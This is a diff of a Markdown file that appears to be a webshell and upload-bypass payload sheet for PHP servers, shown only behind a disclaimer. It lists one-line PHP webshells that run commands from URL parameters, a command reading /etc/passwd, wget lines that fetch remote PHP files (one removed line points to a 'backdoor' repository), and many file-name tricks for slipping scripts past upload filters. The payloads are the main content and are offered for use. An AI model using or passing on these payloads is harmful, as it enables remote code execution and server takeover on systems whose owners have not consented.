@@ -1,19 +1,29 @@
 # Attention
 ```
-**Any misuse of scripts/binaries of this software will not be the responsibility of the author or other collaborators. Use it on your own machine!**
+ANY MISUSE OF SCRIPTS/BINARIES OF THIS SOFTWARE WILL NOT BE THE RESPONSIBILITY OF THE AUTHOR OR OTHER COLLABORATOR. USE IT ON YOUR OWN MACHINE!!!
 ```
-
 # Other
 ```
 system() passthru() exec() shell_exec() fopen() file_get_contents() readfile() fsockopen()
+<?=`$_GET[0]`?>
 ${@print('test')}
 ${@system('ls -la')}
 <?php phpinfo(); ?>
-<?php system('tail /etc/passwd'); ?>
 <?php system('dir'); ?>
-<?php system('wget https://raw.githubusercontent.com/storage1337/backdoor/main/oneline.php'); ?>
-<?=`$_GET[0]`?>
+<?php system('tail /etc/passwd'); ?>
 <?php echo "<pre>"; system($_GET[cmd]); ?> 
+<?php system('wget https://redacted.com/yourfile.php'); ?>
+```
+# Extension Bypass
+```
+php2.php3.php4.php5.php6.php7.phps.phps.pht.phtm.phtml.pgif.shtml.htaccess.phar.inc.hphp.ctp.module.asp.aspx.config.ashx.asmx.aspq.axd.cshtm.cshtml.rem.soap.vbhtm.vbhtml.asa.cer
+file.p.phpp file.php.php file.php%00.jpg
+file.php%00.jpg file.txt.jpg.png.asp
+file.asp\ shell.asp.\
+pHp, .pHP5, .PhAr
+file.php%20 file.php%0a file.php%00 file.php%0d%0a file.php.... file.pHp5....
+file.php#.png file.php%00.png file.php\x00.png file.php%0a.png file.php%0d%0a.png file.php%00.png%00.jpg
+
 ```
 # Webshell 1
 ```
